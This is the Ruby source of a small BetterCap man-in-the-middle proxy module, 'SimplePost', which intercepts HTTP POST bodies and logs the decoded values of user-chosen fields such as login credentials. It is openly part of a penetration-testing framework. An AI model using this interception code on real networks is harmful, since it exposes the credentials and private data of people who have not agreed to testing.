=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class SimplePost < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'SimplePost',
    'Description' => 'Intercept and display only selected POST fields.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  @@fields = nil

  def self.on_options(opts)
    opts.on( '--simple-post-fields FIELD1,FIELD2', 'Comma separated list of POST fields to capture.' ) do |v|
      @@fields = v.split(',').map(&:strip).reject(&:empty?)
    end
  end

  def initialize
    raise BetterCap::Error, "No --simple-post-fields option specified for the proxy module." if @@fields.nil?
  end

  def on_request( request, response )
    if request.post? and !request.body.nil? and !request.body.empty?
      msg = ''
      request.body.split('&').each do |v|
        name, value = v.split('=')
        name ||= ''
        value ||= ''
        if @@fields.include?(name)
          msg << "  #{name.blue} : #{URI.unescape(value).yellow}\n"
        end
      end
      BetterCap::Logger.raw "\n#{msg}\n"
    end
  end
end
